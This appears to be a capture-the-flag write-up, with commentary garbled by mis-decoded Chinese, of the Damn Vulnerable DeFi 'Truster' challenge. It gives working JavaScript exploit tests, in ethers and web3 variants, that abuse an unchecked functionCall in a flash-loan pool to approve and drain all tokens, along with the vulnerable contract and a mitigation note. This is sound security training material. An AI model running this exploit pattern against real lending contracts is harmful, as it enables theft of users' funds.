# ð Challenge #3 - Truster ä¿¡ä»»è

![https://i.imgur.com/nrtLLrw.png](https://i.imgur.com/nrtLLrw.png)

> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free. Currently the pool has 1 million DVT tokens in balance. And you have nothing. But donât worry, you might be able to take them all from the pool. In a single transaction.
>
- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/truster)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/truster/truster.challenge.js)
- é¡ç®èªªæä¸åæ°ä¸ç·çåè²¸æ± æ­£å¨æä¾ DVT çåæçºè²» [[FlashLoan]] æåï¼å®ææ ææä¸ç¾è¬ DVTã
- ç®æ¨æ¯è¦å° ä¸ç¾è¬ DVTä½çºå·±æ

## æèåå¥é»

- éé»è²¸æ¯åè²»çï¼æä»¥å¯ä»¥å©ç¨
- æè¾¦æ³å¯ä»¥ä¸éé¢åï¼
- åªè£å¯ä»¥è½é¢åºä¾çµ¦èªå·±ï¼

## åç´ç è®ï¼å°æ¾æ»æé»

### Study Contracts & Library Imported ç ç©¶å¼ç¨åç´èåº«

- åä¾ç ç©¶ä¸ä¸ï¼æ­¤åç´ç´¢å¼ç¨å°çææåç´ï¼å¯ä»¥çå°ç¸½å±æ import ä¸åæªæ¡

```
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol"; //
import "@openzeppelin/contracts/security/ReentrancyGuard.sol"; // æ¾éå¥æ»æ
```

1. [ERC20](https://docs.openzeppelin.com/contracts/3.x/erc20)
2. [Address Libraries](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address)ï¼å¨ Address å ä¸ä¸äºæ¹æ³ï¼åºæ¬ä¸å¤äºå¾å¤ç¨® callï¼çå° call é½è¦ç¹å¥æ³¨æã - `[isContract(account)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-isContract-address-)` - `[sendValue(recipient, amount)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-sendValue-address-payable-uint256-)` - `[functionCall(target, data)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-)` - `[functionCall(target, data, errorMessage)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCall-address-bytes-string-)` - `[functionCallWithValue(target, data, value)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-)` - `[functionCallWithValue(target, data, value, errorMessage)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionCallWithValue-address-bytes-uint256-string-)` - `[functionStaticCall(target, data)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionStaticCall-address-bytes-)` - `[functionStaticCall(target, data, errorMessage)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionStaticCall-address-bytes-string-)` - `[functionDelegateCall(target, data)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionDelegateCall-address-bytes-)` - `[functionDelegateCall(target, data, errorMessage)](https://docs.openzeppelin.com/contracts/3.x/api/utils#Address-functionDelegateCall-address-bytes-string-)`
3. [ReentrancyGuard](https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard)ï¼é é²éå¥æ»æ

### Study Function ç ç©¶å½å¼å¼±é»

å¯ä»¥æç¸±çè®æ¸ï¼targetãdata ãå¯ä»¥æä½çè¡çºï¼target.functionCall(data)

```solidity
    function flashLoan(
        uint256 borrowAmount,  // â 1. è¦åçéé¡
        address borrower, // â 2. è§¸ç¼åé¢çäºº
        address target, // â 3. å¥æªç targetï¼ä¹ä¸æ¯æ¶é¢æ¹ï¼æ²æéå®ä»»ä½åç´
        bytes calldata data // â 4. ä»»æ data
    ) external nonReentrant {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);

        // ðï¼ functionCall ä¸å°±æ¯ OpenZepplin Library æä¾çæ¹æ³åï¼ æä»¥åºæ¬ä¸æåå¯ä»¥ call ä»»ä½åç´åä»»ä½äº
        // æä»¥å¯ä»¥å¼å« damnValuableToken approve é¢çµ¦ Attackerãéæ¨£æ¢ä¸ææ´æ¹å°é¤é¡ï¼Attackeräºå¾ä¹å¯ä»¥æé¢åèµ°ã
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));

        // ðï¼ å¯ä»¥è®äººåæ´æ¹é¤é¡è®æåéåï¼ çèµ·ä¾æ¯ä¸å¯è½
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
```

## å¯¦ç¾æ»æ

Encode code data æå©ç¨®ä½æ³å¯ä»¥ ecodeï¼æä»¥ä¸é¢ä¹åäºå©ç¨®ä½æ³:

1. [etherJS](https://docs.ethers.io/v5/api/utils/abi/interface/): `interface.encodeFunctionData( fragment [ , values ] ) â string< DataHexString >` [Githubs-encodeFunctionData](https://github.com/ethers-io/ethers.js/blob/master/packages/abi/src.ts/interface.ts#L371)

```jsx
it('Exploit', async function () {
    const iface = new ethers.utils.Interface(["function approve(address sender, uint256 amount)"]);
    await this.pool.flashLoan(
        0,
        attacker.address,
        this.token.address,
        iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
    );
    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
})
```

```
$ yarn run truster
  [Challenge] Truster
    â Exploit (55ms)

  1 passing (930ms)

â¨  Done in 3.67s.
```

1. [web3Js](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html):`web3.eth.abi.encodeFunctionSignature(functionName)` å®æ¹æ¡ç¨éç¨®ä½æ³ï¼ä½æ¯è¦å¦å¤å®è£ @openzeppelin/test-helpers

`npm i @openzeppelin/test-helpers`

```jsx
const { web3 } = require('@openzeppelin/test-helpers/src/setup');
it('Exploit', async function () {
    const data = web3.eth.abi.encodeFunctionCall({
        name: 'approve',
        type: 'function',
        inputs: [{
            type: 'address',
            name: 'spender'
        },{
            type: 'uint256',
            name: 'amount'
        }]
    }, [attacker.address, TOKENS_IN_POOL.toString()]);

    await this.pool.flashLoan(0, attacker.address, this.token.address, data)
    await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
});
```

```
$ yarn run truster
  [Challenge] Truster
    â Exploit (62ms)

  1 passing (925ms)

â¨  Done in 3.99s.
```

## ð§ å¼±é»ç¸½çµ & ä¿®æ¹æ¹å¼

éé¡æåéç¨äº [å¤é¨åç´å¼å«æ»æ Contracts interraction](https://www.so/Contracts-interraction-5ef422648fa34f9d9015bfc5227ef987) ï¼ä¾è® pool æ token æææ¬è½è®çµ¦æåãæä»¥çå°å¤é¨å¼å«ä¸å®è¦ç¹å¥å°å¿ï¼å çº call è£¡é¢ççä»éº¼é½æå¯è½ç¼çãå¦æéé¡è¦ä¿®æ¹çè©±æè©²è¦éå¶ `target.functionCall(data)` å¼å«çåç´ä¸è½æ¯ tokenã

- å¼±é»:
    1. å°å¤é¨åç´çå¼å«æ²æä»»ä½éå¶`target.functionCall(data)`
- æ»æï¼1. è® pool å¼å« token ï¼ç¨ pool çèº«ä»½å° token approve çµ¦èªå·±
- æ¹é²ï¼
    1. éå®ä¸è½å¼å«ç¹å®åç´

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor(address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external nonReentrant {
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}

```

### å®æ´æ¸¬è©¦æªæ¡

```jsx
const { ethers } = require('hardhat');
const { expect } = require('chai');
const { web3 } = require('@openzeppelin/test-helpers/src/setup');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });
    it('Exploit', async function () {
        const iface = new ethers.utils.Interface(["function approve(address sender, uint256 amount)"]);
        await this.pool.flashLoan(
            0,
            attacker.address,
            this.token.address,
            iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
        );
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    })

    // it('Exploit', async function () {
    //     const data = web3.eth.abi.encodeFunctionCall({
    //         name: 'approve',
    //         type: 'function',
    //         inputs: [{
    //             type: 'address',
    //             name: 'spender'
    //         },{
    //             type: 'uint256',
    //             name: 'amount'
    //         }]
    //     }, [attacker.address, TOKENS_IN_POOL.toString()]);

    //     await this.pool.flashLoan(0, attacker.address, this.token.address, data)
    //     await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    // });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

```

## References

- [ERC20](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#IERC20-approve-address-uint256-)
- [Solution](https://github.com/iphelix/damn-vulnerable-defi/blob/master/test/truster/truster.challenge.js)
- [Web3JS](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-abi.html)
- <https://www.damnvulnerabledefi.xyz/challenges/3.html>
